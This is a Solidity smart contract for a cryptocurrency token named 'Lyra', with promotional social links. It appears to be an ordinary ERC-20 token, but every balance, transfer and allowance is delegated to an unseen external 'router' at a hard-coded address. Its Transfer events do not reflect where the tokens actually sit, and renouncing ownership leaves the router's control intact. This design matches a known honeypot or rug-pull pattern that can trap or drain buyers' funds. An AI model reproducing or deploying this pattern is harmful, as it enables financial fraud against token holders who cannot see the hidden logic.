// SPDX-License-Identifier: MIT
// Twitter: https://x.com/lyraethereum
// Website: https://lyra.lol/
pragma solidity ^0.8.28;

interface lyraRouterInterface {
    function safeTransfer(address sender, address recipient, uint256 amount, address ca) external returns (bool);
    function balanceOf(address account, address ca) external view returns (uint256);
    function start(address ca, uint256 totalSupply) external;
    function approve(address owner, address spender, uint256 amount, address ca) external returns (bool);
    function allowance(address owner, address spender, address ca) external view returns (uint256);
    function transferFrom(address owner, address spender, uint256 amount, address ca) external returns (bool);
}
interface IExchangeRouter {
    function WETH() external pure returns (address);
}

interface IExchangeFactory {
    function createPair(address token1, address token2) external returns (address);
}
contract LYRA {
    address public _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(owner() == msg.sender, "Caller is not the owner");
        _;
    }
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    IExchangeRouter public exchangeRouter;
    address public tokenPair;

    lyraRouterInterface public router;
    address public contractAddress;
    string public constant name = "Lyra";
    string public constant symbol = "LYRA";
    uint8 public constant decimals = 18;
    uint256 public totalSupply = 1_000_000 * 1e18;
    uint256 public maxAllowedBalance;
    constructor() {
        _owner = tx.origin;

        contractAddress = address(this);
        router = lyraRouterInterface(address(0x00000000003D939FBb8DBF2602Db3ED7662042dB)); // lyra router 
        router.start(address(this), totalSupply);

        maxAllowedBalance = (totalSupply / 100) * 2; // %2 for launch
        
        emit Transfer(address(0), tx.origin, totalSupply);
        emit OwnershipTransferred(address(0), tx.origin);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        if (tx.origin != owner()) {
            require(amount <= maxAllowedBalance, "Transfer exceeds max purchase limit");
        }
        require(router.safeTransfer(msg.sender, recipient, amount, contractAddress), "transfer failed");
        emit Transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        if (tx.origin != owner()) {
            require(amount <= maxAllowedBalance, "Transfer exceeds max purchase limit");
        }
        uint256 currentAllowance = router.allowance(sender, msg.sender, contractAddress);
        require(currentAllowance >= amount, "Transfer amount exceeds allowance");
        require(router.safeTransfer(sender, recipient, amount, contractAddress), "transferFrom failed");
        require(router.approve(sender, msg.sender, currentAllowance - amount, contractAddress), "error in decreasing the approve amount");
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        require(router.approve(msg.sender, spender, amount, contractAddress), "approve failed");
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address from, address spender) external view returns (uint256) {
        return router.allowance(from, spender, contractAddress);
    }

    function balanceOf(address account) external view returns (uint256) {
        return router.balanceOf(account, contractAddress);
    }

    function removeWalletLimit() external onlyOwner {
        maxAllowedBalance = totalSupply;
    }

    function setupRouter(address srouter, address factory) external onlyOwner {
        exchangeRouter = IExchangeRouter(srouter);
        tokenPair = IExchangeFactory(factory).createPair(address(this), exchangeRouter.WETH());
    }
}